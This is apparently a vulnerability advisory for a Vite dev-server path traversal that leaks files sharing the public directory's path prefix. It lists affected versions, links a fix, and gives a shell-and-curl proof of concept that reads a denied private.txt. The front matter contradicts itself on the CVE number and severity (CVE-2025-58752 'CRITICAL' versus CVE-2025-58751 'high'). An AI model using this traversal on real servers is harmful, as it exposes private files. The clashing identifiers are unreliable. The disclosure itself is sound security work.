---
description: CVE-2025-58752, CRITICAL, Vite restricted file leak
title: Vite arbitrary restricted remote file leak
date_published: "2025-09-15"
last_updated: "2025-09-15"
xray_id:
vul_id: CVE-2025-58751
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Vite arbitrary restricted remote file leak

## Component

[vite](https://www.npmjs.com/package/vite)

## Affected versions

\>=7.1.0,<=7.1.4

\>=7.0.0,<=7.0.6

\>=6.0.0,<=6.3.5

<=5.4.19

## Description

This vulnerability allows a remote attacker to leak files outside of the public directory, assuming the path of the filename to leak has the same prefix as the public directory path.

For example -

Public directory - `/www/p`

File to leak - `/www/private.txt`

## PoC

Execute the following shell commands: (Note that the publicDir is `p`)

```
npm create vite@latest
cd vite-project/
mkdir p
cd p
ln -s a b
cd ..
echo 'import path from "node:path"; import { defineConfig } from "vite"; export default defineConfig({publicDir: path.resolve(__dirname, "p/"), server: {fs: {deny: [path.resolve(__dirname, "private.txt")]}}})' > vite.config.js
echo "secret" > private.txt
npm install
npm run dev
```

Then, in a different shell, run the following command:

```
curl -v --path-as-is 'http://localhost:5173/../private.txt'
```



## Vulnerability Mitigations

No mitigations are supplied for this vulnerability 



## References

[Fix PR](https://github.com/vitejs/vite/pull/20735)
